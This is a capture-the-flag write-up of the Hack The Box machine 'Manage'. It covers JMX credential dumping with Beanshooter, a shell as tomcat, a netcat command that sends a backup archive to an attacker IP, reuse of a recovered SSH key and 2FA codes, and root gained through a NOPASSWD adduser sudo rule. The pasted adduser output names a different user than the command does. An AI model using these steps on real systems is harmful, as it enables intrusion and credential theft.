# Manage — From Java RMI to Root

> **Hack The Box — Manage**
> **Difficulty:** Easy
> **OS:** Linux
> **Target:** `10.129.234.57`

---

## 01 — Overview

Manage is an easy-difficulty Linux machine on Hack The Box.

The initial enumeration revealed three open services: **SSH**, **Java RMI**, and **Apache Tomcat**.

The Java RMI service on port `2222` exposed a JMX registry. Initial exploitation attempts with a Metasploit Java RMI auxiliary module were unsuccessful, so enumeration continued with **Beanshooter**, a tool designed for interacting with Java Management Extensions (JMX).

Beanshooter was able to enumerate the Tomcat users and their credentials. The exposed JMX functionality was then used through Beanshooter's `tonka` functionality to obtain a shell as the `tomcat` user.

Further enumeration revealed a backup archive containing an SSH private key and a Google Authenticator configuration. Using the recovered SSH material allowed access as `useradmin`, with two-factor authentication required during login.

The final privilege escalation came from a permissive `sudo` rule allowing `useradmin` to execute `/usr/sbin/adduser` without a password. This was abused to create a new account with privileged group membership, ultimately providing root access.

---

# 02 — Recon: Finding the Open Services

## Initial Port Scan

The initial scan was performed against the target:

```bash
nmap 10.129.234.57
```

The discovered ports were:

| Port | State | Service                 |
| ---: | ----- | ----------------------- |
|   22 | Open  | SSH                     |
| 2222 | Open  | EtherNetIP-1 / Java RMI |
| 8080 | Open  | HTTP Proxy / Tomcat     |

The full-port scan was also running in the background to ensure that no additional services were missed.

---

# 03 — Service Enumeration: Java RMI Meets Tomcat

A service and version detection scan was performed:

```bash
nmap -sC -sV 10.129.234.57 -p22,2222,8080
```

The results identified:

```text
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
2222/tcp open  java-rmi Java RMI
8080/tcp open  http     Apache Tomcat 10.1.19
```

The Java RMI registry exposed:

```text
jmxrmi
```

and referenced an internal RMI endpoint:

```text
127.0.1.1:41469
```

The Tomcat service was running:

```text
Apache Tomcat/10.1.19
```

This combination of **Java RMI + JMX + Tomcat** made port `2222` particularly interesting.

---

# 04 — First Attempt: Metasploit Java RMI

The Java RMI service was investigated first using the Java RMI auxiliary functionality available through Metasploit.

However, the attempted module did not provide a working foothold.

Rather than stopping at the failed exploit attempt, the Java RMI/JMX service was investigated further.

This led to **Beanshooter**.

---

# 05 — Beanshooter: Unlocking the JMX Service

Beanshooter was used to interact with the exposed Java Management Extensions service.

Repository:

```text
https://github.com/qtc-de/beanshooter
```

The tool was able to enumerate the Tomcat users configured on the server.

The results revealed two accounts:

| Username  | Password                   | Role         |
| --------- | -------------------------- | ------------ |
| `manager` | `fhErvo2r9wuTEYiYgt`       | `manage-gui` |
| `admin`   | `onyRPCkaG4iX72BrRtKgbszd` | `role1`      |

This was a significant finding because the Java management interface exposed credentials for the Tomcat environment.

---

# 06 — Initial Foothold: Tonka Shell

Beanshooter's `tonka` functionality was used against the JMX service:

```bash
beanshooter standard 10.129.234.57 2222 tonka
```

A shell was then requested:

```bash
beanshooter tonka 10.129.234.57 2222 shell
```

A Bash shell was explicitly selected:

```bash
beanshooter tonka shell --shell /bin/bash 10.129.234.57 2222
```

The resulting shell confirmed access as:

```text
[tomcat@10.129.234.57 /]$ whoami
tomcat
```

The initial foothold was therefore:

```text
tomcat
```

---

# 07 — Tomcat Enumeration: Finding the Backup

The Tomcat user's working directory was inspected:

```bash
cd /opt/tomcat
ls
```

The directory contained:

```text
bin
BUILDING.txt
conf
CONTRIBUTING.md
lib
LICENSE
logs
NOTICE
README.md
RELEASE-NOTES
RUNNING.txt
temp
user.txt
webapps
work
```

The user flag was located in the Tomcat directory:

```bash
cat user.txt
```

Further enumeration revealed a backup archive that could be transferred back to the attacking machine.

The notes used:

```bash
nc 10.10.15.95 1234 < backup.tar.gz
```

After receiving the archive locally, it was extracted:

```bash
tar -xvf backup.tar
```

---

# 08 — The Backup: SSH Keys and 2FA

The extracted archive contained:

```text
./
./.bash_logout
./.profile
./.ssh/
./.ssh/id_ed25519
./.ssh/authorized_keys
./.ssh/id_ed25519.pub
./.bashrc
./.google_authenticator
./.cache/
./.cache/motd.legal-displayed
./.bash_history
```

Two files were particularly important:

```text
.ssh/id_ed25519
.google_authenticator
```

The SSH private key provided the authentication material required to move toward the `useradmin` account.

The Google Authenticator configuration also explained the additional authentication requirement.

During SSH login, a 2FA code was requested.

The backup contained the Google Authenticator information, including one-time recovery codes. According to the notes, the available codes could be used once.

---

# 09 — User Access: `useradmin`

Using the recovered SSH material, access was obtained as:

```text
useradmin
```

The SSH authentication process also required the Google Authenticator challenge.

Once logged in as `useradmin`, privilege-escalation enumeration began.

---

# 10 — Privilege Escalation: Inspecting `sudo`

The first important check was:

```bash
sudo -l
```

The output showed:

```text
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

The important finding was:

```text
(ALL : ALL) NOPASSWD: /usr/sbin/adduser
```

This meant `useradmin` could execute `adduser` through `sudo` without supplying a password.

---

# 11 — `adduser`: Turning a Sudo Rule Into Privileged Access

The allowed command was used to create another local account:

```bash
sudo /usr/sbin/adduser admin
```

The command created the new account and prompted for its password and account information.

The notes show the account creation process completing successfully:

```text
Adding user `naval' ...
Adding new group `naval' ...
Adding new user `naval' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
passwd: password updated successfully
```

The newly created account could then be used with:

```bash
sudo su
```

This resulted in a root shell.

---

# 12 — Root Access

After obtaining the privileged shell, the identity was effectively elevated to root.

The root flag was accessed with:

```bash
cat /root/root.txt
```

At this point, the machine was fully compromised.

---

# 13 — Attack Path Summary

```text
                         ┌──────────────────────┐
                         │ 10.129.234.57        │
                         └──────────┬───────────┘
                                    │
                             Port Enumeration
                                    │
                 ┌──────────────────┼──────────────────┐
                 │                  │                  │
                SSH             Java RMI           Tomcat
                :22                :2222              :8080
                                   │
                                   ▼
                              JMX Registry
                                   │
                                   ▼
                              Beanshooter
                                   │
                                   ▼
                          Tomcat Credentials
                                   │
                                   ▼
                              Tonka Shell
                                   │
                                   ▼
                                tomcat
                                   │
                                   ▼
                           Backup Archive
                                   │
                      ┌────────────┴────────────┐
                      │                         │
                  SSH Key               Google Authenticator
                      │                         │
                      └────────────┬────────────┘
                                   │
                                   ▼
                              useradmin
                                   │
                                   ▼
                                sudo -l
                                   │
                                   ▼
                         NOPASSWD: adduser
                                   │
                                   ▼
                           Create Privileged User
                                   │
                                   ▼
                                  root
```

---

# 14 — Key Takeaways

### Java RMI and JMX

An exposed Java RMI/JMX service can provide a significant attack surface, especially when management interfaces are accessible remotely.

### Don't Stop at Failed Exploitation

The initial Java RMI exploitation attempt through Metasploit failed.

Instead of abandoning the service, deeper enumeration led to Beanshooter, which provided a working route through the exposed JMX functionality.

### Credential Enumeration

Beanshooter exposed Tomcat users and their credentials:

```text
manager : fhErvo2r9wuTEYiYgt
admin   : onyRPCkaG4iX72BrRtKgbszd
```

### Sensitive Backups

The backup archive contained:

* SSH private key
* Authorized SSH keys
* Google Authenticator configuration
* Shell history
* User configuration files

Backups should be treated as sensitive assets and protected accordingly.

### Sudo Misconfiguration

The critical privilege-escalation finding was:

```text
NOPASSWD: /usr/sbin/adduser
```

Commands allowed through `sudo` should always be reviewed for ways they can indirectly modify privileged system state.

---

# 15 — Tools Used

| Tool        | Purpose                               |
| ----------- | ------------------------------------- |
| Nmap        | Port and service enumeration          |
| Metasploit  | Initial Java RMI exploitation attempt |
| Beanshooter | JMX/RMI enumeration and exploitation  |
| Netcat      | Backup transfer                       |
| `tar`       | Archive extraction                    |
| SSH         | Remote authentication                 |
| `sudo`      | Privilege-escalation enumeration      |
| `adduser`   | Account creation                      |

---

# 16 — Conclusion

Manage demonstrates how an exposed Java management interface can become the starting point for a complete Linux compromise.

The attack began with basic port enumeration, which revealed Java RMI alongside Apache Tomcat. Although the first Java RMI exploitation attempt was unsuccessful, further investigation with **Beanshooter** exposed Tomcat credentials and enabled a **Tonka shell** as `tomcat`.

Local enumeration then uncovered a backup archive containing SSH authentication material and Google Authenticator configuration, allowing progression to the `useradmin` account.

The final escalation was caused by an overly permissive `sudo` rule allowing passwordless execution of `adduser`. By abusing this capability to create another account, root access was ultimately obtained.

The complete chain was:

**Port Enumeration → Java RMI/JMX → Beanshooter → Tomcat Shell → Sensitive Backup → SSH + 2FA → `useradmin` → Sudo Misconfiguration → Root**
